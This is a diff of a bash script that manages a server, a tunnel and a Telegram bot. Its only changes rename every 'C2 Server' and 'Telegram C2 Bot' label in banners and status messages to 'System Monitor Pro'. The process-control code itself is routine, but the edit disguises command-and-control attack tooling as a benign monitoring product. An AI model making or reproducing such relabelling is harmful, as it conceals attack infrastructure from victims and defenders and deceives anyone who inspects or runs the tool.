@@ -1,6 +1,6 @@
 #!/bin/bash
 # ═══════════════════════════════════════════════════════════════════════════════
-# C2 SERVER - UNIFIED MANAGEMENT SCRIPT
+# SYSTEM MONITOR PRO - UNIFIED MANAGEMENT SCRIPT
 # All-in-one: Server control + Tunnel + Installation + Database sync
 # ═══════════════════════════════════════════════════════════════════════════════
 
@@ -41,8 +41,8 @@ NC='\033[0m'
 show_banner() {
     echo -e "${CYAN}"
     echo "╔══════════════════════════════════════════════════════════════╗"
-    echo "║                    C2 SERVER MANAGER                         ║"
-    echo "║                    Domain: $DOMAIN                      ║"
+    echo "║                SYSTEM MONITOR PRO                           ║"
+    echo "║                Domain: $DOMAIN                      ║"
     echo "╚══════════════════════════════════════════════════════════════╝"
     echo -e "${NC}"
 }
@@ -73,7 +73,7 @@ telegram_start() {
         return 0
     fi
     
-    echo -e "${GREEN}Starting Telegram C2 Bot...${NC}"
+    echo -e "${GREEN}Starting System Monitor Bot...${NC}"
     
     source "$VENV/bin/activate"
     nohup "$VENV/bin/python" "$SCRIPT_DIR/src/telegram_bot.py" > "$TG_LOG_FILE" 2>&1 &
@@ -82,7 +82,7 @@ telegram_start() {
     sleep 1
     
     if [ -f "$TG_PID_FILE" ] && kill -0 $(cat "$TG_PID_FILE") 2>/dev/null; then
-        echo -e "${GREEN}✓ Telegram bot started (PID: $(cat $TG_PID_FILE))${NC}"
+        echo -e "${GREEN}✓ System Monitor bot started (PID: $(cat $TG_PID_FILE))${NC}"
     else
         echo -e "${RED}✗ Failed to start Telegram bot${NC}"
         tail -10 "$TG_LOG_FILE"
@@ -101,7 +101,7 @@ telegram_stop() {
     fi
     
     pkill -f "telegram_bot.py" 2>/dev/null || true
-    echo -e "${GREEN}✓ Telegram bot stopped${NC}"
+    echo -e "${GREEN}✓ System Monitor bot stopped${NC}"
 }
 
 telegram_status() {
@@ -128,7 +128,7 @@ server_start() {
         return 1
     fi
     
-    echo -e "${GREEN}Starting C2 Server...${NC}"
+    echo -e "${GREEN}Starting System Monitor Server...${NC}"
     echo -e "${BLUE}  Host: $HOST${NC}"
     echo -e "${BLUE}  Port: $PORT${NC}"
     
@@ -236,11 +236,11 @@ start_all() {
     telegram_start
     echo ""
     echo -e "${GREEN}╔══════════════════════════════════════════════════════╗${NC}"
-    echo -e "${GREEN}║  C2 SERVER + TELEGRAM BOT RUNNING                     ║${NC}"
+    echo -e "${GREEN}║  SYSTEM MONITOR PRO + TELEGRAM BOT RUNNING            ║${NC}"
     echo -e "${GREEN}╚══════════════════════════════════════════════════════╝${NC}"
     echo ""
     echo -e "  Local:   ${CYAN}http://localhost:$PORT${NC}"
-    echo -e "  C2:      ${GREEN}Telegram Bot Active${NC}"
+    echo -e "  Telegram: ${GREEN}Bot Active${NC}"
 }
 
 stop_all() {
